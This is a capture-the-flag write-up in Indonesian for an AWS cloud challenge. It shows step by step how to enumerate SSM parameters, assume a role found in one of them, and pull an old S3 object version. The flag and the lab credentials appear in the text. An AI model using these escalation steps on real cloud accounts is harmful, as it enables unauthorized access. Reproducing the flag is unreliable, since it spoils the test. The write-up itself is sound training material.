# False Ferry — Cloud CTF Writeup

**Category:** Cloud (AWS)
**Difficulty:** Easy/Medium
**Flag format:** `HTB{...}`

---

## Deskripsi Soal

> Lysa Harrowmere reaches the lower city ferry piers while Stormbound soldiers wait for the morning boat. They are supposed to cross the river and guard the east road before Vaultrune's next patrol moves through. The route board says the boat goes to the east road landing, but the crew roster sends it to a dock controlled by Vaultrune. If Lysa warns the soldiers openly, Vaultrune's men can claim she started a fight at the pier. If she confronts the ferry master, his guards can tear down the roster and post the correct one. Lysa has one job: find the earlier crossing list, prove who changed the dock, and get the soldiers onto the right boat before Vaultrune cuts the road.

Secara teknis, tantangan ini meminta kita untuk:
1. Meng-enumerasi data yang tersimpan di **AWS Systems Manager (SSM) Parameter Store**.
2. Mengidentifikasi entri yang valid di antara banyak entri "palsu"/tidak valid.
3. Melakukan **privilege escalation** melalui **assume role** untuk mendapatkan akses lebih tinggi.
4. Memanfaatkan **S3 object versioning** untuk mengambil versi file yang sudah lama/asli sebelum ditimpa, tempat flag disembunyikan.

## Tools yang Dipakai

- **AWS CLI v2** — untuk berinteraksi dengan AWS API (SSM & S3)
- **PowerShell / Terminal** — untuk menjalankan command
- Kredensial IAM awal yang diberikan panitia (`coalition-ferry-clerk`)

## Informasi Awal yang Diberikan

Dari packet soal, kita diberi kredensial IAM awal:

| Key | Value |
|---|---|
| IAM User | `coalition-ferry-clerk` |
| Access Key ID | `AKIA30RMEZV7ADA3LSUK` |
| Secret Access Key | `L7gOEwZHV6tiLNqyf1CULeBXoxGcx7d3Bz1PayQD` |
| Region | `us-east-1` |

Serta petunjuk penting:
> "Crossing batch metadata lives in Systems Manager under `/ferry/crossing/`. **Catalog the namespace before you read any parameter value.**"

Kalimat terakhir ini adalah hint kuat bahwa kita harus **list/enumerate dulu** semua parameter yang ada sebelum membaca satu per satu — bukan langsung menebak nama parameter.

---

## Step-by-Step Penyelesaian

### 1. Setup AWS CLI dan Kredensial

Instance challenge biasanya punya dua port berbeda: satu untuk web/briefing UI, satu lagi khusus **AWS API endpoint**. Pastikan pakai port AWS API-nya, bukan port yang ada di address bar browser.

```powershell
$env:AWS_ENDPOINT_URL="http://<challenge-ip>:<aws-port>"
$env:AWS_DEFAULT_REGION="us-east-1"
$env:AWS_ACCESS_KEY_ID="AKIA30RMEZV7ADA3LSUK"
$env:AWS_SECRET_ACCESS_KEY="L7gOEwZHV6tiLNqyf1CULeBXoxGcx7d3Bz1PayQD"
Remove-Item Env:\AWS_SESSION_TOKEN -ErrorAction SilentlyContinue
```

Verifikasi kredensial sudah aktif dan valid:

```powershell
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AIDA48DVV8P039UAZ1Z4",
    "Account": "584729103648",
    "Arn": "arn:aws:iam::584729103648:user/coalition-ferry-clerk"
}
```

Kredensial valid, kita login sebagai `coalition-ferry-clerk`.

---

### 2. Mencoba Enumerasi Langsung (Gagal — Sesuai Ekspektasi)

Percobaan pertama adalah cara "normal" untuk list semua parameter di bawah suatu path:

```powershell
aws ssm get-parameters-by-path --path "/ferry/crossing/" --recursive
```

**Output:**
```
aws: [ERROR]: An error occurred (AccessDeniedException) when calling the 
GetParametersByPath operation: User is not authorized to perform: ssm:GetParametersByPath
```

Ditolak. User `coalition-ferry-clerk` sengaja dibatasi izinnya sehingga tidak bisa memakai `GetParametersByPath`. Ini konsisten dengan hint di soal — kita perlu cara lain untuk "catalog the namespace".

Dicoba juga cek policy user, tapi ini juga ditolak:

```powershell
aws iam list-attached-user-policies --user-name coalition-ferry-clerk
```
```
aws: [ERROR]: An error occurred (AccessDenied) when calling the 
ListAttachedUserPolicies operation: User is not authorized to perform: iam:ListAttachedUserPolicies
```

---

### 3. Enumerasi via `describe-parameters` (Berhasil)

Ternyata action `ssm:DescribeParameters` **tidak** diblokir. Ini API berbeda dari `GetParametersByPath` — dia hanya mengembalikan *metadata* parameter (nama, tipe, versi, tanggal modifikasi) tanpa isi/value-nya, jadi izinnya terpisah.

```powershell
aws ssm describe-parameters --parameter-filters "Key=Name,Option=BeginsWith,Values=/ferry/crossing/" --no-cli-pager
```

**Output (ringkas):**
```json
{
    "Parameters": [
        { "Name": "/ferry/crossing/live-crossing-id" },
        { "Name": "/ferry/crossing/CROSSING-VOID-9B11" },
        { "Name": "/ferry/crossing/CROSSING-CLOSED-5E22" },
        { "Name": "/ferry/crossing/CROSSING-DRAFT-8D40" },
        { "Name": "/ferry/crossing/CROSSING-VOID-3C21" },
        { "Name": "/ferry/crossing/CROSSING-7A3F" },
        { "Name": "/ferry/crossing/CROSSING-VOID-1A04" },
        { "Name": "/ferry/crossing/CROSSING-VOID-2D77" }
    ]
}
```

**Analisis pola nama parameter:**

| Parameter | Keterangan |
|---|---|
| `live-crossing-id` | Kemungkinan **pointer** ke ID crossing yang aktif |
| `CROSSING-VOID-*` (4 entri) | Berstatus dibatalkan (decoy) |
| `CROSSING-CLOSED-5E22` | Berstatus ditutup (decoy) |
| `CROSSING-DRAFT-8D40` | Berstatus draft, belum final (decoy) |
| `CROSSING-7A3F` | **Satu-satunya tanpa label status** — kandidat kuat sebagai entri asli/sah |

Ini persis merepresentasikan lore soal: banyak roster palsu (void/closed/draft) sengaja "membanjiri" namespace supaya sulit dibedakan mana yang asli — mirip taktik Vaultrune menyembunyikan crossing list yang sebenarnya.

---

### 4. Membaca Parameter `live-crossing-id`

Karena `live-crossing-id` terlihat seperti pointer, kita baca isinya duluan:

```powershell
aws ssm get-parameter --name "/ferry/crossing/live-crossing-id" --with-decryption
```

**Output:**
```json
{
    "Parameter": {
        "Name": "/ferry/crossing/live-crossing-id",
        "Value": "CROSSING-7A3F",
        "Version": 1
    }
}
```

Terkonfirmasi — `live-crossing-id` menunjuk ke `CROSSING-7A3F`, parameter yang tadi sudah kita curigai sebagai entri asli.

---

### 5. Membaca Isi `CROSSING-7A3F`

```powershell
aws ssm get-parameter --name "/ferry/crossing/CROSSING-7A3F" --with-decryption
```

**Output (value setelah di-parse):**
```json
{
  "crossing_id": "CROSSING-7A3F",
  "status": "AUTHORIZED",
  "issuer": "stormbound-coalition-ferry-office",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "e0598ca8-0e24-44bf-b274-fbe212d96793",
  "record_type": "crossing_manifest"
}
```

Ini adalah kunci utama dari challenge. Ada beberapa informasi krusial:

- **`scanner_role_arn`** → IAM role yang bisa di-*assume* untuk mendapat izin lebih luas
- **`scanner_external_id`** → nilai wajib (`ExternalId`) saat assume role ini — ini adalah pengaman standar AWS agar role tidak bisa di-assume sembarangan (mencegah *confused deputy problem*)
- **`manifest_bucket`** & **`manifest_object_key`** → lokasi file manifest asli di S3
- **`manifest_version_id`** → versi **spesifik** dari file tersebut. Ini penting karena menandakan file sudah pernah di-*overwrite* — versi lama inilah "the earlier crossing list" yang dicari di deskripsi soal

---

### 6. Assume Role untuk Privilege Escalation

Kredensial awal (`coalition-ferry-clerk`) tidak punya akses ke S3. Untuk itu kita perlu "menyamar" jadi role `ferry-crossing-scanner` yang sudah ditemukan:

```powershell
aws sts assume-role `
  --role-arn "arn:aws:iam::584729103648:role/ferry-crossing-scanner" `
  --role-session-name "lysa-session" `
  --external-id "ferry-crossing-scanner-7a3f"
```

**Output:**
```json
{
    "Credentials": {
        "AccessKeyId": "ASIALWVQK8VZ7RN6TAOO",
        "SecretAccessKey": "9yD9WZmStQmBBR7hclnquE3ZodYSqhReAYOs38tI",
        "SessionToken": "BWKovaNVB7i1r...(dipotong)...",
        "Expiration": "2026-07-25T21:03:22.068776+00:00"
    },
    "AssumedRoleUser": {
        "Arn": "arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/lysa-session"
    }
}
```

Berhasil assume role. AWS mengembalikan kredensial **temporary** (`AccessKeyId`, `SecretAccessKey`, `SessionToken`) yang berlaku sampai waktu expired tertentu.

---

### 7. Ganti Kredensial ke Session Baru

Kredensial temporary di atas dipasang ke environment variable, **termasuk `SessionToken`** (wajib untuk temporary credentials):

```powershell
$env:AWS_ACCESS_KEY_ID="ASIALWVQK8VZ7RN6TAOO"
$env:AWS_SECRET_ACCESS_KEY="9yD9WZmStQmBBR7hclnquE3ZodYSqhReAYOs38tI"
$env:AWS_SESSION_TOKEN="BWKovaNVB7i1r...(session token lengkap)..."
```

Verifikasi identitas sudah berubah:

```powershell
aws sts get-caller-identity
```

**Output:**
```json
{
    "UserId": "AROAF8CQOU3N4U151SUT:lysa-session",
    "Account": "584729103648",
    "Arn": "arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/lysa-session"
}
```

Sekarang kita beroperasi sebagai role `ferry-crossing-scanner`, yang seharusnya punya akses ke bucket S3.

---

### 8. Mengambil Versi Lama Manifest dari S3

Ini adalah langkah final. Menggunakan `manifest_version_id` yang ditemukan di langkah 5, kita ambil **versi spesifik** dari objek S3 (bukan versi terbaru/current):

```powershell
aws s3api get-object `
  --bucket ferry-crossing-manifest `
  --key manifests/morning-crossing-order.txt `
  --version-id e0598ca8-0e24-44bf-b274-fbe212d96793 `
  manifest-original.txt

Get-Content manifest-original.txt
```

**Output:**
```
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{ferry_crossing_dock_seal_4be4b9b0725b13e56b1511fa3a7d17f1}
```

## Flag

```
HTB{ferry_crossing_dock_seal_4be4b9b0725b13e56b1511fa3a7d17f1}
```

---

## Kesimpulan

Challenge ini mensimulasikan skenario **cloud misconfiguration & privilege escalation** yang cukup umum ditemukan di lingkungan AWS nyata:

1. **Least privilege yang bocor sebagian** — user awal tidak bisa `GetParametersByPath`, tapi masih bisa `DescribeParameters`. Ketika satu API diblokir, jangan berhenti — cek API lain yang punya fungsi mirip tapi izin terpisah.
2. **"Needle in a haystack" enumeration** — banyak parameter decoy (VOID/CLOSED/DRAFT) sengaja ditaruh untuk mengaburkan mana entri yang valid. Kunci untuk membedakannya biasanya ada di pola penamaan atau parameter "pointer" (seperti `live-crossing-id`).
3. **IAM Role chaining (assume-role)** — kredensial awal seringkali hanya "pintu masuk" untuk menemukan role lain dengan izin lebih tinggi. Perhatikan field seperti `scanner_role_arn` dan `scanner_external_id` di data yang ditemukan — `ExternalId` wajib disertakan saat assume role kalau role tersebut mensyaratkannya.
4. **S3 Object Versioning sebagai tempat penyimpanan "sejarah"** — file yang sudah di-*overwrite* tidak benar-benar hilang jika bucket punya versioning aktif. Versi lama tetap bisa diakses lewat `--version-id`, dan di situlah bukti "siapa yang mengubah dock" (dan flag-nya) tersembunyi.

